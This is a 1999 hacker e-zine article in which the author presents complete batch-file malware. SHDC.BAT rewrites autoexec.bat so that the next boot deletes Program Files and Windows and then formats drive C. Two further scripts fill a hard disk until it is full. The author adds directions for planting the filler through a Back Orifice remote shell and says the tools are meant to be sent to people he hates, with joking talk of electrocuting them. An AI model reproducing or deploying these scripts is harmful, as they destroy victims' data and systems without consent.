      _________   SWAT MAGAZINE ISSUE SEVENTEEN: MAY 1999   __________
     /         \___________________________________________/          \
    /             Another few killer batch files               \
   /                       By -=The Firestarter=-                       \
   -----------------------------------------------------------------------


   SWATeam hard Drive Cleaner
   ==========================
   Looks like i never get board with creating batch files to fuck over
   hard drives, my latest creation is called "SWATeam Hard Drive Cleaner"
   well maybe the name isn't very original, but personally i couldn't
   give a fuck.
   I actually tested this batch file on my computer, well not with my
   current hard drive, I got a 270mb hard drive from Brakis a few months
   back, that drive has been the testing ground for most of my little
   creations.
   It took only two minutes to fuck it over, and all that time i thought
   that windows was loading (well ok i didn't, i actually knew what was
   happening).

   So what makes this little file so elite? well nothing really, it's a
   hell of a lot simpler than the previous version. This version doesn't
   take the time to cipher and then delete files, it simply deletes every
   thing on your hard drive, a good point is that it doesn't need any
   other programs (the last version did, remember) and it can be used if
   you just send it to somebody.

   A basic run down of this program is as follows:
   1) It writes to the autoexec.bat awaiting the computer to reboot.
   2) the computer reboots and all of the c:\progra~1 directory get's
      deleted
   3) A few files get copied from the c:\windows\command directory
   4) c:\windows get's deleted, as do all the subdirectories (isn't
      deltree great fun)
   5) The hard drive get's formatted (unconditionaly; of course).

   Simple isn't it, like i said, it only takes two minutes, hmm hang on,
   it takes less than that because i removed the ability to fill the
   hard drive before deleting everything (copied c:\windows into one big
   huge file, then duplicated it several times before the drive was
   formatted.

   Some of you will think that programs like this are lame, but i don't
   give a shit, there's people out there that i hate with a passion, and
   what better way to digitally say "FUCK YOU" than to format there hard
   drive, hmm thinking about that last statement i think that ramming
   there head into the monitor and turning on the power might be a
   slightly better way to deal with them, but that would defeat the whole
   object of deleting there hard drive, perhaps ramming there head into
   the montor after they've reinstalled everything?. I'm rambling on here,
   i'll shut up about electrocuting people now.

   I mean this batch file has the same usage as the previous version,
   this one is also easier to use since it doesn't need to be "primed"
   by running it on the target computer in the c:\ directory.

   Anyway here's the source code for my loverly creation:

   --cut SHDC.BAT--

   @ echo off
   rem OHHHH YEEEEEEEEEEAAAAAAAAAAAAAAAAAAAAHHHHHHHH The second version
   rem of this program is ready, more powerful than the first version, and
   rem overall, a far superiour annihilation tool. All bow down to the:
   rem SWATeam Hard Drive Cleaner! Guaranteed to give somebody a bad day.

   cls
   call attrib -h -r c:\autoexec.bat >nul
   echo @echo off >c:\autoexec.bat
   echo deltree /y c:\progra~1\*.* >nul >>c:\autoexec.bat
   echo copy c:\windows\command\format.com c:\ >nul >>c:\autoexec.bat
   echo copy c:\windows\command\deltree.exe c:\ >nul >>c:\autoexec.bat
   echo deltree /y c:\windows\*.* >nul >>c:\autoexec.bat
   echo format c: /q /u /autotest >nul >>c:\autoexec.bat

   Rem That little piece of code will ensure that the hard drive get's
   rem pretty much scrubbed. In my tests it took only 2 minutes to wipe
   rem a hard drive of a few hundred megs of data.
   rem So maybe it isn't as big as the firist version, but atleast it
   rem doesn't use any other programs as it copies the required files
   rem from the hard drive. Yes so it is very simple, it only took me
   rem five minutes to write, when i can be bothered i'll write a more
   rem efficent hard drive annihilator. You'll probably be able to get
   rem hold of it via http://www.swateam.org
   rem Coded by -=The Firestarter=- ('cause i was board)

   --cut SHDC.BAT--

   yeah mearly by looking at the sorce code, anyone who knows anything
   about batch files, or even MS-DOS will know exactly what happens.

   Filler and KILLER FILLER
   =========================

   Well incase some of you want to fill a hard drive without actually
   formatting it, since filling a hard drive can be just as problamatic
   for the poor sod who's computer it is. filler and KILLER FILLER are the
   same program, only KILLER FILLER is a lot faster than Filler.

   simply run this batch file:

   --cut fill.bat--
   @echo off
   :fill
   echo a >nul >>fill.txt
   goto fill
   --cut fill.bat--

   what that will do is create a file that contains a list of A's, the
   file will keep on growing until the hard drive is full or the file is
   prevented from running. Killer filler on the other hand...



   --cut killfill.bat--
   @echo off
   :killfill
   echo LOOKS LIKE YA DRIVES FULL! >nul >>killfill.txt
   <above line repeated here, and for another 50 lines>
   goto killfill
   --cut killfill.bat--

   That would grow at a rate of about 300kb a second, or something near to
   that anyway. The disadvantage of that version is that there will almost
   certainly be left over space (ok so it will only be a few kb's),
   where as the first version will, at the most have only 1 byte left over
   from it. I actually tried a bigger version of this batch file, one
   that was 1.34mb big, that was extreamly fast and didn't take long to
   fill the 270mb hard drive, a gigabyte drive on the otherhand, well that
   would take ages. One advantage of these files is that they compress
   amazingly well, so they can be transferd to computers extreamly easily.

   So how long does it take to fill a hard drive? fucking ages is the
   answer. If one the other hand your into destroying computers using
   Back Orofice, then spawning c:\command.com on port 23, telnetting to
   it and then type this in:

   echo @echo off >killfill.bat
   echo :killfill  >>killfill.bat
   echo echo LOOKS LIKE YA DRIVES FULL! >nul >>killfill.txt >>killfill.bat
   echo goto killfill >>killfill.bat

   then go to "spawn program" and spawn it as unviewable. Ok so it does
   still take ages, you can modify it to write to the autoexec.bat file
   if you really want.

   Anyway have fun messing about with those programs, i might write an
   article on batch files (on how to write them) some time in the near
   future.
